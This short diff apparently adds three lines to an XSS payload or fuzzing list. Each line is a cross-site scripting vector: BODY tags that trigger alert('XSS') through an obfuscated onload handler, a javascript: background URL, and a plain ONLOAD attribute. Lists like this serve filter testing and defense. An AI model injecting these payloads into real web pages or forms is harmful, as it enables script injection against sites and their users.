@@ -1,0 +1,3 @@
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
